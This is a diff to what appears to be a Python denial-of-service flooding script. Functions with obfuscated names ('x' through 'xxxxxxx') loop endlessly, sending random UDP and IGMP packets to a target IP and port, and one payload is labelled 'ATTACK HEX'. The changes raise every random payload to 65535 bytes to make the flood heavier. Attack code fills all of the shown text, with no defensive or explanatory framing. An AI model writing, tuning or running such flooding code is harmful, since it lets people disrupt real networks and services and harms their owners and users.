@@ -94,7 +94,7 @@ def spoofer():
 def xxxxxxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
+        bytes = random._urandom(65535) #1081
         pack = random._urandom(999) #666
         payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
         msg = Randomlex[random.randrange(0, 9)]
@@ -119,7 +119,7 @@ def xxxxxxx():
 def xxxxxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
+        bytes = random._urandom(65535)
         payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
         sock.sendto(bytes, (ip, int(port)))
         sock.sendto(payload, (ip, int(port)))
@@ -139,7 +139,7 @@ def xxxxxx():
 def xxxxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
+        bytes = random._urandom(65535) #1081
         pack = random._urandom(999) #666
         msg = Randomlex[random.randrange(0, 9)]
         sock.sendto(bytes, (ip, int(port)))
@@ -162,7 +162,7 @@ def xxxxx():
 def xxxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
+        bytes = random._urandom(65535)
         sock.sendto(bytes, (ip, int(port)))
         sock.sendto(Randomlex[0], (ip, int(port)))
         sock.sendto(Randomlex[0], (ip, int(port)))
@@ -181,8 +181,8 @@ def xxxx():
 def xxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(666) #666
+        bytes = random._urandom(65535) #1081
+        pack = random._urandom(999) #666
         msg = Randomlex[random.randrange(0, 9)]
         sock.sendto(bytes, (ip, int(port)))
         sock.sendto(pack, (ip, int(port)))
@@ -204,7 +204,7 @@ def xxx():
 def xx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
+        bytes = random._urandom(65535)
         sock.sendto(bytes, (ip, int(port)))
         sock.sendto(Randomlex[0], (ip, int(port)))
         sock.sendto(Randomlex[0], (ip, int(port)))
@@ -223,7 +223,7 @@ def xx():
 def x():
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
+        bytes = random._urandom(65535) #1081
         pack = random._urandom(999) #666
         msg = Randomlex[random.randrange(0, 9)]
         sock.sendto(bytes, (ip, int(port)))
